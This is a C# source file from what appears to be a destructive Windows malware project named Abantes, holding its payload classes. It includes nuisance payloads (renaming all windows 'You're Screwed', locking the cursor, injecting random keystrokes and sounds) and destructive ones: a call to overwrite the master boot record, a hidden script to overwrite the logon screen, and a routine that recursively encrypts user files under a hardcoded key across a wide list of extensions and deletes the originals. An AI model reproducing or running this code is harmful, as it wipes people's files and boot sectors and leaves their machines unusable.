using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using Abantes.Utils;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Media;
using Microsoft.Win32;

namespace Abantes.Payloads
{
    class Threads
    {

    }
    class Anoying
    {
        [DllImport("user32.dll")]
        static extern int SetWindowText(IntPtr hWnd, string text);
        public static void ChangeWindowText()
        {
            Process[] allProcesses = Process.GetProcesses();
            for (int i = 0; i < allProcesses.Length; i++)
            {
                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
            }
        }
        static Point Position;
        static Random _random = new Random();
        public static void MouseTrap()
        {
            Position.X = 100;
            Position.Y = 100;
            while (true)
            {
                Cursor.Position = Position;
            }
        }
        public static void RandomKeyboard()
        {
            while (true)
            {
                if (_random.Next(100) > 95)
                {
                    char key = (char)(_random.Next(25) + 65);
                    if (_random.Next(2) == 0)
                    {
                        key = Char.ToLower(key);
                    }
                    SendKeys.SendWait(key.ToString());
                }
                Thread.Sleep(400);
            }
        }
        public static void RandomOSSounds()
        {
            while (true)
            {
                if (_random.Next(100) > 80)
                {
                    switch (_random.Next(5))
                    {
                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(400);
            }
        }
    }
    class Destructive
    {
        [DllImport("Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
        public static extern void MBR_Overwrite();
        public static void MBROverwrite()
        {
            MBR_Overwrite();
        }
        public static void LogonUIOverwrite()
        {
            string TempPath = Path.GetTempPath();
            Process ScriptProcess = new Process();
            ScriptProcess.StartInfo.CreateNoWindow = true;
            ScriptProcess.StartInfo.FileName = TempPath + "\\logonOverwrite.bat"; 
            ScriptProcess.Start();
        }
        public static void EncryptUserFiles()
        {
            List<string> pathsToEncrypt = new List<string>();
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (string currentPath in pathsToEncrypt)
            {
                GetFilesAndEncrypt(currentPath);
            }
        }
        static void GetFilesAndEncrypt(string Ps)
        {
            try
            {
                var validExtensions = new[]
                {
                    ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf",
                    ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".rar", ".zip", ".7zip", ".7z", ".dat", ".csv",
                    ".efx", ".sdf", ".vcf", ".xml", ".ses", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt",
                    ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx",
                    ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb",
                    ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm",".wav",
                    ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv",
                    ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".m4a", ".ico", ".dic", ".rex", ".hmg", ".config", ".resx", ".res"
                };
                string[] files = Directory.GetFiles(Ps);
                foreach (string currentFile in files)
                {
                    string extension = Path.GetExtension(currentFile);
                    if (validExtensions.Contains(extension))
                    {
                        Encryption.FileEncrypt(currentFile, "WR8h2GIbf9FGz6VVlSzJ");
                        File.Delete(currentFile);
                    }
                }
                string[] subDirs = Directory.GetDirectories(Ps);
                foreach (string currentPath in subDirs)
                {
                    GetFilesAndEncrypt(currentPath);
                }
            }
            catch { }
        }
    }
    class WatchDogThreads
    {

    }
}
